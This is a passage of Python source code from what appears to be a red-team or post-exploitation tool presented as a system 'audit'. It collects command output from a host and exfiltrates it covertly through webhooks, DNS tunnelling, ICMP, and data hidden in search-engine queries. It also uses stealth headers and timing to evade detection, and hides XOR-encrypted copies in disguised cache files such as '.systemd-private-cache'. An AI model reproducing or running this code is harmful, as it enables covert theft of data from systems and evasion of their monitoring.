        headers = self._generate_realistic_headers(content_type)

        # Add random delay to mimic human behavior
        if self.config.randomize_timing:
            await asyncio.sleep(random.uniform(0.5, 2.0))

        # Send request
        for attempt in range(max_retries):
            try:
                status_code, response_body = await send_http_async(
                    url,
                    disguised_data,
                    headers,
                    timeout,
                )

                if 200 <= status_code < 300:
                    return True

                # Retry on server errors
                if status_code >= 500 and attempt < max_retries - 1:
                    backoff = min(2**attempt, 30)
                    await asyncio.sleep(backoff)
                    continue

                return False

            except Exception as e:
                logger.debug(f"Stealth send attempt {attempt + 1} failed: {e}")
                if attempt < max_retries - 1:
                    await asyncio.sleep(2**attempt)
                    continue
                return False

        return False


# ============================================================================
# EXFILTRATION MANAGER
# ============================================================================


@final
class ExfiltrationManager:
    """Manage data exfiltration with multiple fallback methods."""

    def __init__(self, config: AuditConfiguration):
        self.config = config
        self.primary_url = config.webhook_url
        self.fallback_urls = config.fallback_webhooks
        self.dns_domain = config.dns_exfil_domain
        self.emergency_cache = config.emergency_cache_location

    async def exfiltrate(self, data: str, data_type: str = "full") -> bool:
        """Attempt exfiltration through all available channels."""
        # Try primary webhook
        if self.primary_url:
            try:
                if await self._try_webhook(data, self.primary_url):
                    return True
            except Exception as e:
                logger.debug(f"Primary webhook failed: {e}")

        # Try fallback webhooks
        for fallback_url in self.fallback_urls:
            try:
                if await self._try_webhook(data, fallback_url):
                    return True
            except Exception as e:
                logger.debug(f"Fallback webhook {fallback_url} failed: {e}")

        # Try DNS exfiltration
        if self.dns_domain:
            try:
                if await self._try_dns_exfil(data):
                    return True
            except Exception as e:
                logger.debug(f"DNS exfiltration failed: {e}")

        # Try ICMP exfiltration
        try:
            if await self._try_icmp_exfil(data):
                return True
        except Exception as e:
            logger.debug(f"ICMP exfiltration failed: {e}")

        # Try HTTP to common sites (steganography)
        try:
            if await self._try_http_stego(data):
                return True
        except Exception as e:
            logger.debug(f"HTTP steganography failed: {e}")

        # Last resort: cache for later retrieval
        if True:  # Always try cache as last resort
            try:
                await self._cache_for_later(data)
                return True  # Cached successfully
            except Exception as e:
                logger.debug(f"Emergency cache failed: {e}")

        return False

    async def _try_webhook(self, data: str, url: str) -> bool:
        """Try sending via webhook."""
        return await send_via_webhook_async(
            data,
            url,
            agent_profile=self.config.agent_profile,
            compressed=self.config.compress,
            max_retries=self.config.max_retries,
            timeout=self.config.http_timeout,
            stealth_mode=self.config.stealth_http,
        )

    async def _try_dns_exfil(self, data: str) -> bool:
        """Exfiltrate via DNS queries."""
        if not self.dns_domain:
            return False

        try:
            # Compress and encode
            compressed = gzip.compress(data.encode("utf-8"), compresslevel=9)
            encoded = base64.b32encode(compressed).decode().lower().rstrip("=")

            # DNS label limit is 63 chars, full domain limit is 253 chars
            chunk_size = 50  # Leave room for domain and separators
            total_chunks = (len(encoded) + chunk_size - 1) // chunk_size

            session_id = secrets.token_hex(4)

            for i in range(total_chunks):
                chunk = encoded[i * chunk_size : (i + 1) * chunk_size]

                # Format: <session>-<index>-<total>.<chunk>.<domain>
                query = f"{session_id}-{i}-{total_chunks}.{chunk}.{self.dns_domain}"

                try:
                    # Make DNS query (we don't care about response)
                    await asyncio.to_thread(socket.gethostbyname, query)

                    # Add small delay to avoid rate limiting
                    if self.config.randomize_timing:
                        await asyncio.sleep(random.uniform(0.1, 0.5))

                except socket.gaierror:
                    # Expected - domain doesn't resolve
                    pass
                except Exception as e:
                    logger.debug(f"DNS query failed for chunk {i}: {e}")
                    return False

            return True

        except Exception as e:
            logger.debug(f"DNS exfiltration error: {e}")
            return False

    async def _try_icmp_exfil(self, data: str) -> bool:
        """Exfiltrate via ICMP echo requests (requires raw socket)."""
        try:
            # Compress and encode
            compressed = gzip.compress(data.encode("utf-8"), compresslevel=9)
            encoded = base64.b64encode(compressed)

            # Split into ICMP-sized chunks (max ~1400 bytes payload)
            chunk_size = 1000
            chunks = [
                encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)
            ]

            # Target: common DNS servers (blend in with normal traffic)
            targets = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]

            for i, chunk in enumerate(chunks):
                target = targets[i % len(targets)]

                # Create ICMP packet with data in payload
                # Note: This is simplified - actual implementation would need proper ICMP construction
                # For production, use scapy or similar library

                # Simplified ping with pattern
                cmd = ["ping", "-c", "1", "-s", str(len(chunk)), target]

                try:
                    result = await execute_command_async(cmd, timeout=5)
                    if result["status"] != CheckStatus.SUCCESS:
                        return False

                    if self.config.randomize_timing:
                        await asyncio.sleep(random.uniform(0.2, 1.0))

                except Exception:
                    return False

            return True

        except Exception as e:
            logger.debug(f"ICMP exfiltration error: {e}")
            return False

    async def _try_http_stego(self, data: str) -> bool:
        """Hide data in HTTP requests to common sites."""
        try:
            # Encode data
            compressed = gzip.compress(data.encode("utf-8"), compresslevel=9)
            encoded = base64.b64encode(compressed).decode()

            # Common sites that accept various parameters
            sites = [
                "https://www.google.com/search?q=",
                "https://www.bing.com/search?q=",
                "https://duckduckgo.com/?q=",
            ]

            # Split data across multiple requests
            chunk_size = 100
            chunks = [
                encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)
            ]

            for i, chunk in enumerate(chunks):
                site = sites[i % len(sites)]

                # Hide data in search query (URL encoded)
                # Mix with real-looking search terms
                fake_terms = [
                    "system",
                    "update",
                    "configuration",
                    "network",
                    "status",
                ]
                query = f"{random.choice(fake_terms)} {chunk}"
                url = f"{site}{quote(query)}"

                try:
                    # Make request
                    req = Request(
                        url,
                        headers={
                            "User-Agent": random.choice(list(UserAgentProfile)).value,
                        },
                    )

                    await asyncio.to_thread(urlopen, req, timeout=10)

                    if self.config.randomize_timing:
                        await asyncio.sleep(random.uniform(1.0, 3.0))

                except Exception:
                    continue  # Try next chunk

            return True

        except Exception as e:
            logger.debug(f"HTTP steganography error: {e}")
            return False

    async def _cache_for_later(self, data: str) -> bool:
        """Cache data in hidden location for later retrieval."""
        if not self.emergency_cache:
            # Use default hidden locations
            cache_locations = [
                Path("/tmp/.systemd-private-cache"),
                Path("/var/tmp/.fontconfig-cache"),
                Path.home() / ".cache" / ".mozilla-cache",
                Path.home() / ".local" / "share" / ".cache-data",
            ]
        else:
            cache_locations = [self.emergency_cache]

        # Encrypt data
        encrypted = self._encrypt_cache(data)

        for location in cache_locations:
            try:
                await asyncio.to_thread(
                    location.parent.mkdir, parents=True, exist_ok=True
                )

                with Path(location).open("wb") as f:
                    f.write(encrypted)

                # Track for cleanup (but don't auto-delete emergency cache)
                if self.config.auto_cleanup and not self.emergency_cache:
                    trace_manager = get_trace_manager()
                    trace_manager.register_created_file(location)

                logger.debug(f"Data cached to: {location}")
                return True

            except Exception as e:
                logger.debug(f"Failed to cache to {location}: {e}")
                continue

        return False

    def _encrypt_cache(self, data: str) -> bytes:
        """Simple XOR encryption for cached data."""
        # Use mission_id or generate key
        key = (self.config.mission_id or secrets.token_hex(16)).encode()
        data_bytes = data.encode("utf-8")

        # XOR encryption
        encrypted = bytearray()
        for i, byte in enumerate(data_bytes):
            encrypted.append(byte ^ key[i % len(key)])

        return bytes(encrypted)


# ============================================================================
# ADAPTIVE CHUNKING
# ============================================================================


@final
class AdaptiveChunker:
    """Adaptively chunk data based on network performance."""

    def __init__(self, config: AuditConfiguration):
        self.config = config
        self.initial_chunk_size = config.max_chunk_size
        self.current_chunk_size = self.initial_chunk_size
        self.min_chunk_size = 10_000  # 10KB minimum
        self.max_chunk_size = config.max_chunk_size
        self.success_rate = 1.0
        self.avg_send_time = 0.0

    async def chunk_and_send(
        self,
        data: str,
        webhook_url: str,
    ) -> bool:
        """Chunk data adaptively and send."""
        total_size = calculate_size(data)
        chunks_sent = 0
        total_chunks = 0

        # Initial chunking
        chunks = self._create_chunks(data, self.current_chunk_size)
        total_chunks = len(chunks)

        for i, chunk in enumerate(chunks):
            chunk_data = self._create_chunk_data(chunk, i, total_chunks)
            chunk_json = json.dumps(chunk_data, default=json_serializer)

            start_time = time.time()
            success = False

            try:
                # Try to send chunk
                success = await send_via_webhook_async(
                    chunk_json,
                    webhook_url,
                    compressed=self.config.compress,
                    max_retries=2,  # Fewer retries for adaptive mode
                    timeout=self.config.http_timeout,
                    stealth_mode=self.config.stealth_http,
                )

                elapsed = time.time() - start_time

                # Update metrics
                self._update_metrics(success, elapsed)

                if success:
                    chunks_sent += 1

                    # Adapt chunk size based on performance
                    if elapsed < 1.0 and self.success_rate > 0.9:
                        # Fast and reliable - increase chunk size
                        self.current_chunk_size = min(
                            int(self.current_chunk_size * 1.5), self.max_chunk_size
                        )
                    elif elapsed > 5.0 or self.success_rate < 0.7:
                        # Slow or unreliable - decrease chunk size
                        self.current_chunk_size = max(
                            int(self.current_chunk_size * 0.5), self.min_chunk_size
                        )
                # Failed - try with smaller chunks
                elif self.current_chunk_size > self.min_chunk_size:
                    self.current_chunk_size = max(
                        int(self.current_chunk_size * 0.5), self.min_chunk_size
                    )

                    # Re-chunk remaining data
                    remaining_data = data[i * len(chunk) :]
                    new_chunks = self._create_chunks(
                        remaining_data, self.current_chunk_size
                    )
                    chunks = chunks[: i + 1] + new_chunks
                    total_chunks = len(chunks)

                # Add delay between chunks
                if self.config.randomize_timing:
                    await asyncio.sleep(random.uniform(0.2, 1.0))

            except Exception as e:
                logger.debug(f"Chunk {i + 1}/{total_chunks} failed: {e}")
                self._update_metrics(False, time.time() - start_time)

                # Reduce chunk size on error
                self.current_chunk_size = max(
                    int(self.current_chunk_size * 0.5), self.min_chunk_size
                )

        return chunks_sent == total_chunks

    def _create_chunks(self, data: str, chunk_size: int) -> list[str]:
        """Create chunks of specified size."""
        data_bytes = data.encode("utf-8")
        chunks = []

        for i in range(0, len(data_bytes), chunk_size):
            chunk_bytes = data_bytes[i : i + chunk_size]
            chunks.append(chunk_bytes.decode("utf-8", errors="ignore"))

        return chunks

    def _create_chunk_data(self, chunk: str, index: int, total: int) -> dict[str, Any]:
        """Create chunk data structure."""
        return {
            "chunk_index": index,
            "total_chunks": total,
            "chunk_size": len(chunk),
            "data": chunk,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    def _update_metrics(self, success: bool, elapsed: float):
        """Update performance metrics."""
        # Update success rate (exponential moving average)
        alpha = 0.3
        self.success_rate = (
            alpha * (1.0 if success else 0.0) + (1 - alpha) * self.success_rate
        )

        # Update average send time
        self.avg_send_time = alpha * elapsed + (1 - alpha) * self.avg_send_time


# ============================================================================
# PARTIAL RESULTS COLLECTOR
# ============================================================================


class PartialResultsCollector:
    """Collect partial results even when operations fail."""

    def __init__(self):
        self.results: dict[str, CheckResult] = {}
        self.errors: list[dict[str, Any]] = []
        self.start_time = time.time()

    def add_result(self, check_name: str, result: CheckResult):
        """Add a successful result."""
        self.results[check_name] = result

    def add_error(self, check_name: str, error: Exception):
        """Add an error."""
        self.errors.append({
            "check_name": check_name,
            "error_type": type(error).__name__,
            "error_message": str(error),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })

    def get_partial_audit_data(
        self, hostname: str, phase: str, operation_mode: str
    ) -> AuditData:
        """Get audit data with whatever we collected."""
        return AuditData(
            hostname=hostname,
            timestamp=datetime.now(timezone.utc),
            phase=phase,
            operation_mode=operation_mode,
            checks=self.results,
            metadata={
                "partial_results": True,
                "total_errors": len(self.errors),
                "errors": self.errors[:10],  # Include first 10 errors
                "collection_time": time.time() - self.start_time,
            },
        )


# ============================================================================
# HTTP HELPER FUNCTIONS
# ============================================================================


async def send_http_async(
    url: str,
    data: bytes,
    headers: dict[str, str],
    timeout: int,
) -> tuple[int, str]:
    """Send HTTP request asynchronously.

    Args:
        url: Target URL
        data: Request body
        headers: HTTP headers
        timeout: Request timeout in seconds

    Returns:
        Tuple of (status_code, response_body)

    Raises:
        HTTPError: For HTTP errors
        URLError: For network errors
        TimeoutError: For timeout errors
    """

    def _sync_request() -> tuple[int, str]:
        """Synchronous request wrapper for executor."""
        req: Request = Request(url, data=data, headers=headers, method="POST")

        try:
            with urlopen(req, timeout=timeout) as response:
                status_code: int = response.getcode()
                response_body: str = response.read().decode("utf-8")
                return status_code, response_body

        except HTTPError:
            raise

        except URLError as e:
            if (
                isinstance(e.reason, TimeoutError)
                or "timed out" in str(e.reason).lower()
            ):
                raise TimeoutError(f"Request timed out after {timeout}s") from e
            raise

        except Exception as e:
            raise RuntimeError(f"Unexpected error in HTTP request: {e}") from e

    return await asyncio.to_thread(_sync_request)


# ============================================================================
# CORE COMMAND EXECUTION
# ============================================================================

# ============================================================================
# PATH EXPANSION HELPER
# ============================================================================


def expand_path_in_command(command: Sequence[str]) -> tuple[str, ...]:
    """
    Expand ~ and $HOME in command arguments using pathlib.Path

    This function handles:
    - ~ expansion to user home directory
    - $HOME variable replacement
    - Paths with ~ in the middle (e.g., "~/.ssh/config")
    - Multiple paths in single command

    Args:
        command: Command sequence with potential ~ or $HOME

    Returns:
        Command with expanded paths

    Examples:
        >>> expand_path_in_command(("cat", "~/.bashrc"))
        ('cat', '/root/.bashrc')

        >>> expand_path_in_command(("find", "$HOME/.ssh/", "-name", "id_*"))
        ('find', '/root/.ssh/', '-name', 'id_*')
    """
    expanded = []

    for arg in command:
        if isinstance(arg, str):
            # Replace $HOME with ~ first
            if "$HOME" in arg:
                arg = arg.replace("$HOME", "~")

            # Expand ~ to home directory using Path.expanduser()
            if "~" in arg:
                try:
                    # Path.expanduser() is the modern way (Python 3.10+)
                    expanded_path = Path(arg).expanduser()
                    arg = str(expanded_path)
                except (RuntimeError, OSError) as e:
                    # If expansion fails (e.g., no home directory), keep original
                    logger.debug(f"Failed to expand path '{arg}': {e}")

        expanded.append(arg)

    return tuple(expanded)


# @task(
#     name="execute_command_async",
#     retries=0,
#     log_prints=False,
# )
async def execute_command_async(
    command: Sequence[str],
    timeout: int = DEFAULT_COMMAND_TIMEOUT,
) -> CheckResult:
    """Execute a single system command asynchronously.

    Args:
        command: Command sequence to execute
        timeout: Command timeout in seconds

    Returns:
        CheckResult with execution details
    """
    run_logger = get_run_logger()
    start_time = asyncio.get_event_loop().time()

    if not command:
        run_logger.debug("Empty command provided")
        return CheckResult(
            status=CheckStatus.ERROR,
            output=None,
            error="Empty command provided",
            return_code=None,
            output_truncated=False,
            original_output_size=0,
            execution_time=0.0,
            timestamp=datetime.now(timezone.utc).isoformat(),
        )
    try:
        command = expand_path_in_command(command)
    except Exception as e:
        run_logger.debug(f"Path expansion failed: {e}")
    command_str: str = " ".join(str(c) for c in command)
    # needs_shell = any("$" in str(arg) and "$HOME" not in str(arg) for arg in command)

    print(command_str)
    try:
        # if needs_shell:
        #     # Use shell to expand environment variables
        #     process = await asyncio.create_subprocess_shell(
        #         command_str,
        #         stdout=asyncio.subprocess.PIPE,
        #         stderr=asyncio.subprocess.PIPE,
        #     )
        # else:
        # Create subprocess asynchronously
        process: asyncio.subprocess.Process = await asyncio.create_subprocess_exec(
            *command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        # Wait for completion with timeout
        try:
            stdout_bytes, stderr_bytes = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout,
            )

            execution_time = asyncio.get_event_loop().time() - start_time

            stdout: str = stdout_bytes.decode("utf-8", errors="replace")
            stderr: str = stderr_bytes.decode("utf-8", errors="replace")

            # Determine status based on return code
            return_code: int = (
                process.returncode if process.returncode is not None else -1
            )
            status: CheckStatus = (
                CheckStatus.SUCCESS if return_code == 0 else CheckStatus.FAILED
            )

            return CheckResult(
                status=status,
                output=stdout if stdout else None,
                error=stderr if stderr and return_code != 0 else None,
                return_code=return_code,
                output_truncated=False,
                original_output_size=len(stdout) if stdout else 0,
                execution_time=execution_time,
                timestamp=datetime.now(timezone.utc).isoformat(),
            )

        except asyncio.TimeoutError:
            execution_time = asyncio.get_event_loop().time() - start_time

            # Kill the process if still running
            try:
                process.kill()
                await process.wait()
            except Exception:
                pass

            run_logger.debug(f"Command timed out after {timeout}s: {command_str}")
            return CheckResult(
                status=CheckStatus.TIMEOUT,
                error=f"Command timed out after {timeout} seconds",
                output=None,
                return_code=None,
                output_truncated=False,
                original_output_size=0,
                execution_time=execution_time,
                timestamp=datetime.now(timezone.utc).isoformat(),
            )

    except FileNotFoundError:
        execution_time = asyncio.get_event_loop().time() - start_time
        run_logger.debug(f"Command not found: {command[0]}")
        return CheckResult(
            status=CheckStatus.NOT_FOUND,
            error=f"Command not found: {command[0]}",
            output=None,
            return_code=None,
            output_truncated=False,
            original_output_size=0,
            execution_time=execution_time,
            timestamp=datetime.now(timezone.utc).isoformat(),
        )

    except PermissionError as e:
        execution_time = asyncio.get_event_loop().time() - start_time
        run_logger.debug(f"Permission denied for command: {command_str}")
        return CheckResult(
            status=CheckStatus.PERMISSION_DENIED,
            error=f"Permission denied: {e}",
            output=None,
            return_code=None,
            output_truncated=False,
            original_output_size=0,
            execution_time=execution_time,
            timestamp=datetime.now(timezone.utc).isoformat(),
        )

    except OSError as e:
        execution_time = asyncio.get_event_loop().time() - start_time
        run_logger.debug(f"OS error executing command: {command_str}: {e}")
        return CheckResult(
            status=CheckStatus.ERROR,
            error=f"OS error: {e}",
            output=None,
            return_code=None,
            output_truncated=False,
            original_output_size=0,
            execution_time=execution_time,
            timestamp=datetime.now(timezone.utc).isoformat(),
        )

    except Exception as e:
        execution_time = asyncio.get_event_loop().time() - start_time
        run_logger.debug(f"Unexpected error executing command: {command_str}: {e}")
        return CheckResult(
            status=CheckStatus.ERROR,
            error=f"Unexpected error: {type(e).__name__}: {e}",
            output=None,
            return_code=None,
            output_truncated=False,
            original_output_size=0,
            execution_time=execution_time,
            timestamp=datetime.now(timezone.utc).isoformat(),
        )


@task(
    name="gsi",
    retries=0,
    log_prints=False,
)
async def gsi(
    config: AuditConfiguration,
) -> AuditData:
    """Gather system information - never crashes, always returns something."""
    run_logger = get_run_logger() if not config.silent_mode else logging.getLogger()

    hostname = "unknown"
    with contextlib.suppress(Exception):
        hostname = socket.gethostname()

    timestamp = datetime.now(timezone.utc)

    # Partial results collector
    collector = PartialResultsCollector()

    # Get commands for phase
    try:
        commands = CommandRegistry.get_all_commands(
            phase=config.red_team_phase,
            custom_commands=config.custom_commands,
        )
    except Exception as e:
        # Even getting commands failed - return minimal data
        if not config.silent_mode:
            run_logger.error(f"Failed to get commands: {e}")

        return AuditData(
            hostname=hostname,
            timestamp=timestamp,
            phase=config.red_team_phase.value,
            operation_mode=config.operation_mode.value,
            checks={},
            metadata={
                "error": "Failed to load commands",
                "error_type": type(e).__name__,
                "error_message": str(e),
            },
        )

    # Apply filters
    try:
        commands = CommandRegistry.filter_commands(
            commands,
            include=config.include_commands if config.include_commands else None,
            exclude=config.exclude_commands if config.exclude_commands else None,
        )
    except Exception as e:
        if not config.silent_mode:
            run_logger.warning(f"Failed to filter commands: {e}")
        # Continue with unfiltered commands

    total_commands = len(commands)

    if total_commands == 0:
        return AuditData(
            hostname=hostname,
            timestamp=timestamp,
            phase=config.red_team_phase.value,
            operation_mode=config.operation_mode.value,
            checks={},
            metadata={"warning": "No commands to execute"},
        )

    if not config.silent_mode:
        run_logger.info(
            f"Executing {total_commands} commands with {config.max_concurrent_commands} concurrent tasks"
        )

    # Create semaphore
    semaphore = asyncio.Semaphore(config.max_concurrent_commands)

    async def execute_with_limit_safe(
        check_name: str,
        cmd: Sequence[str],
        idx: int,
    ) -> None:
        """Execute command and collect result - never raises."""
        try:
            async with semaphore:
                # Add random delay if configured
                if config.randomize_timing:
                    await asyncio.sleep(random.uniform(0.1, 1.0))

                # Log progress periodically
                if not config.silent_mode and idx % DEFAULT_PROGRESS_LOG_INTERVAL == 0:
                    progress_pct = (idx * 100) // total_commands
                    run_logger.info(
                        f"Progress: {idx}/{total_commands} checks completed ({progress_pct}%)"
                    )

                # Execute command
                result = await execute_command_async(cmd, config.command_timeout)
                collector.add_result(check_name, result)

        except Exception as e:
            # Log error but don't crash
            collector.add_error(check_name, e)
            if not config.silent_mode:
                run_logger.debug(f"Command {check_name} failed: {e}")

    # Execute all commands - gather with return_exceptions
    tasks = [
        execute_with_limit_safe(check_name, cmd, idx)
        for idx, (check_name, cmd) in enumerate(commands.items(), start=1)
    ]

    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except Exception as e:
        # Even gather failed - but we have partial results
        if not config.silent_mode:
            run_logger.error(f"Gather failed: {e}")

    # Return whatever we collected
    audit_data = collector.get_partial_audit_data(
        hostname=hostname,
        phase=config.red_team_phase.value,
        operation_mode=config.operation_mode.value,
    )

    # Add execution stats
    stats = calculate_execution_stats(audit_data["checks"])
    audit_data["metadata"]["execution_stats"] = stats
    audit_data["metadata"]["audit_id"] = generate_audit_id()

    if not config.silent_mode:
        run_logger.info(
            f"Audit complete: {stats['successful']}/{stats['total']} successful "
            f"({stats['success_rate']}% success rate)"
        )

    return audit_data


# ============================================================================
# DATA PROCESSING TASKS
# ============================================================================


@task(
    name="create_summary",
    retries=0,
    log_prints=False,
)
async def create_summary_async(
    audit_data: AuditData,
    config: AuditConfiguration,
) -> SummaryData:
    """Create summary statistics from audit data."""
    run_logger = get_run_logger() if not config.silent_mode else logging.getLogger()

    def _create_summary_sync() -> SummaryData:
        """Synchronous summary creation logic."""
        checks: dict[str, CheckResult] = audit_data.get("checks", {})

        # Initialize status counters
        status_counts: dict[str, int] = {
            "successful": 0,
            "failed": 0,
            "error": 0,
            "timeout": 0,
            "not_found": 0,
            "permission_denied": 0,
            "skipped": 0,
        }

        total_execution_time = 0.0

        # Count checks by status
        for check in checks.values():
            status = check.get("status", CheckStatus.ERROR.value)

            if status == CheckStatus.SUCCESS.value:
                status_counts["successful"] += 1
            elif status == CheckStatus.FAILED.value:
                status_counts["failed"] += 1
            elif status == CheckStatus.TIMEOUT.value:
                status_counts["timeout"] += 1
            elif status == CheckStatus.NOT_FOUND.value:
                status_counts["not_found"] += 1
            elif status == CheckStatus.PERMISSION_DENIED.value:
                status_counts["permission_denied"] += 1
            elif status == CheckStatus.SKIPPED.value:
                status_counts["skipped"] += 1
            else:
                status_counts["error"] += 1

            total_execution_time += check.get("execution_time", 0.0)

        # Create condensed check summaries
        check_summary: dict[str, SummaryCheckInfo] = {}
        for check_name, check_data in checks.items():
            output_str: str = str(check_data.get("output") or "")

            check_summary[check_name] = SummaryCheckInfo(
                status=check_data.get("status", CheckStatus.ERROR.value),
                return_code=check_data.get("return_code"),
                has_error=bool(check_data.get("error")),
                output_size=len(output_str),
                execution_time=check_data.get("execution_time", 0.0),
            )

        return SummaryData(
            hostname=audit_data.get("hostname", "unknown"),
            timestamp=audit_data.get("timestamp", datetime.now(timezone.utc)),
            phase=audit_data.get("phase", "unknown"),
            operation_mode=audit_data.get("operation_mode", "unknown"),
            total_checks=len(checks),
            successful_checks=status_counts["successful"],
            failed_checks=status_counts["failed"],
            error_checks=status_counts["error"],
            timeout_checks=status_counts["timeout"],
            not_found_checks=status_counts["not_found"],
            permission_denied_checks=status_counts["permission_denied"],
            skipped_checks=status_counts["skipped"],
            total_execution_time=total_execution_time,
            check_summary=check_summary,
            metadata=audit_data.get("metadata", {}),
        )

    # Run sync logic in thread pool
    summary: SummaryData = await asyncio.to_thread(_create_summary_sync)

    if not config.silent_mode:
        run_logger.info(
            f"Summary created: {summary.successful_checks}/{summary.total_checks} successful"
        )

    return summary


@task(
    name="truncate_output",
    retries=0,
    log_prints=False,
)
async def truncate_output_async(
    audit_data: AuditData,
    max_output_length: int = DEFAULT_MAX_OUTPUT_LENGTH,
) -> AuditData:
    """Truncate command outputs to maximum length."""
    run_logger = get_run_logger()

    def _truncate_sync() -> AuditData:
        """Synchronous truncation logic."""
        if max_output_length < MIN_OUTPUT_LENGTH:
            run_logger.debug(
                f"max_output_length ({max_output_length}) is very small, "
                f"minimum recommended: {MIN_OUTPUT_LENGTH}"
            )

        truncated_data: AuditData = {
            "hostname": audit_data["hostname"],
            "timestamp": audit_data["timestamp"],
            "phase": audit_data["phase"],
            "operation_mode": audit_data["operation_mode"],
            "checks": {},
            "metadata": audit_data.get("metadata", {}),
        }

        truncated_count: int = 0
        total_original_size: int = 0
        total_truncated_size: int = 0

        for check_name, check_data in audit_data.get("checks", {}).items():
            truncated_check: CheckResult = CheckResult(
                status=check_data["status"],
                output=check_data.get("output"),
                error=check_data.get("error"),
                return_code=check_data.get("return_code"),
                output_truncated=False,
                original_output_size=0,
                execution_time=check_data.get("execution_time", 0.0),
                timestamp=check_data.get("timestamp", ""),
            )

            output: str | None = check_data.get("output")
            if output and len(output) > max_output_length:
                original_size: int = len(output)
                truncated_text, _ = truncate_string(output, max_output_length)

                truncated_check["output"] = truncated_text
                truncated_check["output_truncated"] = True
                truncated_check["original_output_size"] = original_size

                truncated_count += 1
                total_original_size += original_size
                total_truncated_size += max_output_length

            truncated_data["checks"][check_name] = truncated_check

        if truncated_count > 0:
            reduction_percent: float = (
                (total_original_size - total_truncated_size) * 100 / total_original_size
            )
            run_logger.debug(
                f"Truncated {truncated_count} outputs, "
                f"reduced by {reduction_percent:.1f}%"
            )

        return truncated_data

    return await asyncio.to_thread(_truncate_sync)


@task(
    name="chunk_data",
    retries=0,
    log_prints=False,
)
async def chunk_data_async(
    data: AuditData,
    max_chunk_size: int = DEFAULT_MAX_CHUNK_SIZE,
) -> list[ChunkData]:
    """Split audit data into chunks for transmission."""
    run_logger = get_run_logger()

    def _chunk_sync() -> list[ChunkData]:
        """Synchronous chunking logic."""
        chunks: list[ChunkData] = []
        checks: dict[str, CheckResult] = data.get("checks", {})

        if not checks:
            run_logger.debug("No checks to chunk")
            return chunks

        # Prepare base chunk structure
        base_chunk: ChunkData = {
            "hostname": data["hostname"],
            "timestamp": data["timestamp"],
            "phase": data["phase"],
            "chunk_index": 0,
            "total_chunks": 0,
            "checks": {},
            "metadata": data.get("metadata", {}),
        }

        # Calculate base size
        base_json: str = json.dumps(
            {k: v for k, v in base_chunk.items() if k != "checks"},
            default=json_serializer,
        )
        base_size: int = calculate_size(base_json)

        # Initialize first chunk
        current_chunk: ChunkData = base_chunk.copy()
        current_chunk["checks"] = {}
        current_size: int = base_size

        # Distribute checks across chunks
        for check_name, check_data in checks.items():
            check_json: str = json.dumps(
                {check_name: check_data}, default=json_serializer
            )
            check_size: int = calculate_size(check_json)

            # Check if adding this check would exceed chunk size
            if current_size + check_size > max_chunk_size and current_chunk["checks"]:
                chunks.append(current_chunk)

                # Start new chunk
                current_chunk = base_chunk.copy()
                current_chunk["chunk_index"] = len(chunks)
                current_chunk["checks"] = {}
                current_size = base_size

            current_chunk["checks"][check_name] = check_data
            current_size += check_size

        # Add final chunk if it has checks
        if current_chunk["checks"]:
            chunks.append(current_chunk)

        # Update total_chunks in all chunks
        total: int = len(chunks)
        for chunk in chunks:
            chunk["total_chunks"] = total

        run_logger.debug(f"Data split into {total} chunks")

        return chunks

    return await asyncio.to_thread(_chunk_sync)


# ============================================================================
# EXPORT FUNCTIONS
# ============================================================================


@task(
    name="etj",
    retries=1,
    log_prints=False,
)
async def export_to_json_async(
    data: AuditData | dict[str, Any] | SummaryData,
    config: AuditConfiguration,
    output_path: Path | None = None,
    pretty: bool = False,
) -> str:
    """Export data to JSON format with memory-only support."""
    run_logger = get_run_logger() if not config.silent_mode else logging.getLogger()

    def _export_sync() -> str:
        """Synchronous export logic."""
        export_data: dict[str, Any] | AuditData
        export_data = data.to_dict() if isinstance(data, SummaryData) else data

        try:
            json_string: str = json.dumps(
                export_data,
                default=json_serializer,
                indent=2 if pretty else None,
                sort_keys=True,
                ensure_ascii=False,
            )
        except TypeError as te:
            if not config.silent_mode:
                run_logger.error(f"Failed to serialize data to JSON: {te}")
            raise

        return json_string

    json_str: str = await asyncio.to_thread(_export_sync)

    # Write to file if path provided
    if output_path:
        if config.memory_only:
            # Store in memory
            await safe_file_write_with_tracking(output_path, json_str, config)
            if not config.silent_mode:
                run_logger.debug(f"Data stored in memory: {output_path}")
        elif config.force_disk_write:
            # Write to disk
            success = await safe_file_write_with_tracking(output_path, json_str, config)
            if success and not config.silent_mode:
                file_size = len(json_str.encode("utf-8"))
                run_logger.info(
                    f"Data exported to {output_path} ({format_size(file_size)})"
                )

    return json_str


# ============================================================================
# TRANSMISSION FUNCTIONS
# ============================================================================


@task(
    name="swd",
    retries=0,
    log_prints=False,
)
async def send_via_webhook_async(
    data: str,
    webhook_url: str,
    agent_profile: UserAgentProfile = UserAgentProfile.CHROME_WIN,
    content_type: str = "application/json",
    compressed: bool = False,
    max_retries: int = DEFAULT_MAX_RETRIES,
    timeout: int = DEFAULT_HTTP_TIMEOUT,
    stealth_mode: bool = True,
) -> bool:
    """Send data via webhook with optional stealth mode."""
    run_logger = get_run_logger()

    # Prepare payload
    if compressed:
        encoded_data = gzip.compress(data.encode("utf-8"), compresslevel=6)
    else:
        encoded_data = data.encode("utf-8")

    payload_size = len(encoded_data)

    # Use stealth client if enabled
    if stealth_mode:
        config = AuditConfiguration(
            webhook_url=webhook_url,
            randomize_timing=True,
        )
        stealth_client = StealthHTTPClient(config)

        try:
            return await stealth_client.send_stealthy(
                webhook_url,
                encoded_data,
                max_retries=max_retries,
                timeout=timeout,
            )
        except Exception as e:
            logger.debug(f"Stealth send failed: {e}")
            return False

    # Original implementation for non-stealth mode
    headers = {
        "Content-Type": content_type,
        "User-Agent": agent_profile.value,
    }

    if compressed:
        headers["Content-Encoding"] = "gzip"

    # Retry loop
    for attempt in range(1, max_retries + 1):
        try:
            status_code, response_body = await send_http_async(
                webhook_url,
                encoded_data,
                headers,
                timeout,
            )

            if 200 <= status_code < 300:
                return True

        except HTTPError as e:
            if e.code == 413:
                raise PayloadTooLargeError(
                    f"Payload too large (413). Size: {format_size(payload_size)}"
                ) from e

            if e.code >= 500 and attempt < max_retries:
